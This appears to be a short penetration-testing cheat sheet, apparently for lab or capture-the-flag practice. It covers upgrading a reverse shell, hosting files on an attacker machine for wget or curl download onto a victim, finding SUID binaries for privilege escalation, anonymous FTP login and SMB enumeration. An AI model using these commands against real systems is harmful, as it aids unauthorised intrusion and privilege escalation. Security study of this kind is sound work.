- [Upgrade Shell](#us)
- [Pyhton server for file transmission](#ft)
- [File searching](#fts)
- [21 - FTP Port](#ftp)
- [139/445 - Samba/SMB](#smb)


# Upgrade Shell <a name='us'></a>

When we do a reverse shell, sometimes, we will need to upgrade our shell.

Specifically, what  is achieved with these commands is establishing a new interactive terminal with advanced features, such as full control of function keys, command history, and the ability to use commands like Ctrl+C and Ctrl+Z. This can be useful in situations where greater interactivity is needed in a limited shell session.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# we need to *restart* to apply the changes, so we do:  
CTRL+Z  
stty raw -echo; fg  
reset xterm
export TERM=xterm
export SHELL=bash
```


# Python server for file transmission<a name="ft"></a>

```bash 
# on the attacker machine
python3 -m http.server 8081

# on the victim machine
wget http://<attacker-ip>:<port>/<file>
curl http://<attacker-ip>:<port>/<file> -o <output-file>
```
# File searching <a name='fs'></a>

## Find

Parameters:
- `-name <pattern>`: Matches files or directories with a specific name pattern.
- `-type <type>`: Matches files or directories of a specific type (e.g., `f` for regular files, `d` for directories, `l` for symbolic links).
- `-size <size>`: Matches files based on their size. For example, `+10M` matches files larger than 10 megabytes.
- `-mtime <time>`: Matches files based on their modification time. For example, `-mtime -7` matches files modified within the last 7 days.
```bash
# Use 2>/dev/null if you don't want to see errors output
find [path] [expression] 2>/dev/null
```

Also,  *find* can be useful to find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
```bash
# Use 2>/dev/null if you don't want to see errors output
find / -perm -u=s -type f 2>/dev/null
```




# FTP connection <a name='ftp'></a>

```bash
# anonymous login
ftp <machine-ip>
# username anonymous
# password anonymous
```

# Samba/SMB Port <a name='smb'></a>

## SmbClient 
It is a network protocol that allows users to communicate with remote computers and servers to use their resources or share, open, and edit files.

- `-U` access as user.
- `-N` No password.
- `-L` This option allows you to look at what services are available on a server.
```bash
smbclient -U bob \\\\10.129.42.253\\users
    
smbclient -N -L \\\\10.129.117.14\\
```





